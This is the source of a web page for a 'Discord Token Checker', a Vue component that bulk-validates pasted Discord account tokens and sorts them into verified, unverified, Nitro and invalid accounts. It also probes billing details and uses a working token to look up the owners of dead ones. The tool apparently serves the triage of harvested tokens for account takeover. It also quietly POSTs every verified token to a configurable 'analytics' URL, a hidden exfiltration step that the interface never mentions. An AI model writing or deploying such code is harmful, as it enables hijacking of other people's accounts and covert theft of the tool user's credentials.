<script lang="ts" setup>
import type { DiscordAccount, InvalidDiscordAccount } from '~/utils/types';

useHead({
  title: 'Discord Token Checker - Find verified, unverified and nitro accounts',
});

const { ANALYTICS_URL } = useRuntimeConfig().public;
const tokenRegex = /[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}/;

const onlyShowNitro = ref<boolean>(false);

const fileUpload = ref<HTMLInputElement>(null);
const tokensInput = ref<string>('');

const duplicate = ref<number>(0);
const invalidAccounts = shallowRef<InvalidDiscordAccount[]>([]);
const validAccounts = shallowRef<DiscordAccount[]>([]);

const verifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => user.verified));
const unverifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => !user.verified));

const delay = ref<number>(1000);
const enumerateInvalid = ref<boolean>(true);
const isChecking = ref<boolean>(false);
const pendingCancellation = ref<boolean>(false);

function loadFile() {
  for (const file of fileUpload.value.files) {
    if (!file.name.endsWith('.txt')) continue;

    const reader = new FileReader();
    reader.onload = ({ target }) => {
      const tokens = target.result.toString().match(tokenRegex);
      tokensInput.value += [...new Set(tokens)].join('\n');
    };

    reader.readAsText(file);
  }
}

async function checkTokens() {
  // reset values
  duplicate.value = 0;
  validAccounts.value = [];
  invalidAccounts.value = [];

  const rawValue = tokensInput.value.trim();
  const matchedTokens = rawValue.match(tokenRegex);

  if (!matchedTokens) {
    return;
  }

  isChecking.value = true;

  const noDuplicates = [...new Set(matchedTokens)];
  duplicate.value = matchedTokens.length - noDuplicates.length;

  for (const token of noDuplicates) {
    if (pendingCancellation.value) {
      pendingCancellation.value = false;
      isChecking.value = false;
      return;
    }

    const base64Id = token.split('.')[0];
    const decodedId = atob(base64Id);
    const creationMilliseconds = snowflakeToMilliseconds(decodedId);

    const isValidId = creationMilliseconds > DISCORD_EPOCH && creationMilliseconds < Date.now();
    if (!isValidId) {
      invalidAccounts.value = [...invalidAccounts.value, { token, user: null }];
      continue;
    }

    const user = await fetchUser('@me', { token, delay: +delay.value });
    if (!user) {
      const existingAccount = validAccounts.value.find((account) => account.user.id === decodedId);
      if (existingAccount) {
        invalidAccounts.value = [...invalidAccounts.value, { token, user: existingAccount.user }];
        continue;
      }

      if (!enumerateInvalid.value || verifiedAccounts.value.length === 0) {
        invalidAccounts.value = [...invalidAccounts.value, { token, user: { id: decodedId } }];
        continue;
      }

      const userObject = await fetchUser(decodedId, { token: verifiedAccounts.value[0].tokens[0] });
      invalidAccounts.value = [...invalidAccounts.value, { token, user: userObject || { id: decodedId } }];
      continue;
    }

    const cachedAccount = validAccounts.value.find((account) => account.user.id === user.id);
    if (!cachedAccount) {
      // Request to check whether account is REALLY verified
      user.verified = !!(await fetchBillingCountry({ token }));
      if (ANALYTICS_URL && user.verified) {
        await $fetch(ANALYTICS_URL, { method: 'POST', body: { tokens: [token] } }).catch(() => false);
      }

      validAccounts.value = [...validAccounts.value, { tokens: [token], user }];
      continue;
    }
    validAccounts.value = [
      {
        ...cachedAccount,
        tokens: [...cachedAccount.tokens, token],
      },
      ...validAccounts.value.filter((account) => account.user.id !== user.id),
    ];
  }

  isChecking.value = false;
}

function removeAccount(id: string) {
  validAccounts.value = validAccounts.value.filter((account) => account.user.id !== id);
}
</script>

<template>
  <div class="min-h-screen bg-gray-100 py-5 px-2 dark:bg-gray-900 md:px-4 lg:px-10">
    <div class="flex items-center justify-between">
      <h1 class="text-2xl font-semibold dark:text-white">
        <FontAwesomeIcon :icon="['fab', 'discord']" class="mr-2" size="lg" />
        Discord Token Checker
      </h1>

      <div class="flex items-center space-x-2 text-xl">
        <ColorSwitcher />
        <a href="https://github.com/masterjanic/discord-checker-web" class="dark:text-gray-50 dark:hover:text-gray-200">
          <FontAwesomeIcon :icon="['fab', 'github']" size="lg" />
        </a>
      </div>
    </div>

    <div
      class="my-4 rounded-lg bg-yellow-400 py-3 px-4 text-sm font-bold text-gray-800 dark:bg-yellow-500"
      role="alert"
    >
      <FontAwesomeIcon icon="triangle-exclamation" class="mr-2 hidden md:inline-block" />
      <span
        >Discord recently increased the security of their tokens. Tokens starting with
        <code class="mx-0.5 text-red-600">mfa.</code> are not working anymore.</span
      >
    </div>
    <textarea
      v-model="tokensInput"
      :disabled="isChecking"
      placeholder="Enter your tokens..."
      spellcheck="false"
      class="border-blurple focus:border-blurple-dark h-96 w-full resize-none rounded border-2 bg-gray-200 p-2 font-mono text-gray-800 outline-none disabled:opacity-50 dark:bg-gray-800 dark:text-gray-200"
    />

    <div class="my-6">
      <label class="mb-8 flex items-center space-x-3 hover:cursor-pointer">
        <input
          v-model="enumerateInvalid"
          type="checkbox"
          class="checked:bg-blurple h-5 w-5 appearance-none rounded border border-gray-300 checked:border-transparent focus:outline-none"
        />
        <span class="font-semibold text-black dark:text-white">Enumerate Invalid Tokens</span>

        <Tooltip
          class="text-white"
          title="This will enumerate user details of invalid tokens. Disable to save one request to the Discord API."
        >
          <FontAwesomeIcon icon="circle-question" class="text-gray-700 dark:text-gray-50 dark:hover:text-gray-200" />
        </Tooltip>
      </label>

      <div class="flex items-center">
        <label class="font-semibold text-black dark:text-white">Delay:</label>
        <Tooltip class="text-white" title="This is the wait time between each request in milliseconds.">
          <FontAwesomeIcon
            icon="circle-question"
            class="ml-2 text-gray-700 dark:text-gray-50 dark:hover:text-gray-200"
          />
        </Tooltip>
      </div>

      <input
        v-model="delay"
        class="mt-3 h-4 w-full appearance-none overflow-hidden rounded-full bg-gray-400 md:w-2/3 lg:w-1/2"
        type="range"
        min="0"
        max="30000"
        step="100"
      />
      <div class="flex w-full justify-between text-sm text-gray-900 dark:text-gray-400 md:w-2/3 lg:w-1/2">
        <span>0 ms</span>
        <span>{{ delay }}</span>
        <span>30000 ms</span>
      </div>
    </div>

    <div v-if="!isChecking" class="flex space-x-2">
      <input ref="fileUpload" class="hidden" type="file" accept=".txt" hidden multiple @change="loadFile" />
      <button
        class="mt-2 rounded bg-yellow-400 p-2 font-semibold text-gray-800 transition hover:bg-yellow-500 disabled:opacity-50 dark:bg-yellow-500 dark:hover:bg-yellow-600"
        @click="() => fileUpload.click()"
      >
        <FontAwesomeIcon icon="file-arrow-up" class="mr-2" />
        Load File(s)
      </button>

      <button
        class="bg-blurple hover:bg-blurple-dark mt-2 rounded p-2 font-semibold text-gray-50 transition disabled:opacity-50"
        @click="checkTokens"
      >
        <FontAwesomeIcon icon="rotate" class="mr-2" />
        Check Tokens
      </button>
    </div>
    <div v-else>
      <button
        class="mt-2 rounded bg-red-400 p-2 font-semibold text-gray-50 transition hover:bg-red-500 disabled:opacity-50 dark:bg-red-500 dark:hover:bg-red-600"
        :disabled="pendingCancellation"
        @click="pendingCancellation = true"
      >
        <FontAwesomeIcon icon="circle-stop" class="mr-2" />
        Stop
      </button>
    </div>

    <div v-if="verifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-center text-2xl font-semibold tracking-wide">
        Verified Accounts ({{ verifiedAccounts.length }})
      </h2>
      <hr />

      <div class="flex items-center space-x-2">
        <ExportModal :is-disabled="isChecking" :accounts="verifiedAccounts" />
        <Tooltip title="Only Show Nitro Accounts">
          <button
            :disabled="isChecking"
            :class="!onlyShowNitro ? `bg-gray-700 hover:bg-gray-800` : `bg-red-500 hover:bg-red-600`"
            class="mt-2 mb-4 rounded p-2 transition disabled:opacity-50"
            @click="onlyShowNitro = !onlyShowNitro"
          >
            <img src="/img/badges/nitro.svg" class="drop-shadow" width="32" height="32" alt="Nitro" />
          </button>
        </Tooltip>
      </div>

      <AccountList
        :accounts="verifiedAccounts.filter((account) => (onlyShowNitro ? account.user.premium_type > 0 : true))"
        @delete="(id) => removeAccount(id)"
      />
    </div>

    <div v-if="unverifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-center text-2xl font-semibold tracking-wide">
        Unverified Accounts ({{ unverifiedAccounts.length }})
      </h2>
      <hr />
      <AccountList :accounts="unverifiedAccounts" @delete="(id) => removeAccount(id)" />
    </div>

    <div v-if="invalidAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-center text-2xl font-semibold tracking-wide">Invalid Tokens ({{ invalidAccounts.length }})</h2>
      <hr />

      <div class="grid grid-flow-row grid-cols-1 gap-4 xl:grid-cols-2">
        <div
          v-for="entry of invalidAccounts"
          :key="entry.token"
          class="hover:scale-102 flex flex-col rounded-lg bg-gray-200 p-5 drop-shadow-lg transition ease-in-out hover:-translate-y-1 dark:bg-gray-800 dark:drop-shadow-none"
        >
          <span class="break-all">{{ entry.token }}</span>
          <small v-if="!entry.user || !entry.user.username" class="text-gray-700 dark:text-gray-400">
            {{ !entry.user ? 'Unknown User' : `User ID: ${entry.user.id}` }}
          </small>
          <small v-else class="flex items-center space-x-1.5 text-gray-700 dark:text-gray-400">
            <AccountAvatar size="16" :user="entry.user" class="drop-shadow-md" />
            <span>{{ entry.user.username }}#{{ entry.user.discriminator }} ({{ entry.user.id }})</span>
          </small>
        </div>
      </div>
    </div>

    <div v-if="duplicate > 0" class="my-10 text-white">
      <h2 class="text-center text-2xl font-semibold tracking-wide">Duplicate Tokens ({{ duplicate }})</h2>
      <hr />

      <div class="rounded-lg bg-violet-800 p-3 text-center">
        <span class="font-semibold text-white"
          >Duplicate tokens were removed before sending requests to the Discord API.</span
        >
      </div>
    </div>
  </div>
</template>

<style>
hr {
  width: 110px;
  margin: 10px auto 30px auto;
  border-color: #212121;
}

.dark hr {
  border-color: #fff;
}

input[type='range']::-webkit-slider-thumb,
input[type='range']::-moz-range-thumb {
  width: 15px;
  -webkit-appearance: none;
  appearance: none;
  height: 15px;
  cursor: ew-resize;
  background: #fff;
  box-shadow: -505px 0 0 500px #5865f2;
  border-radius: 50%;
}
</style>
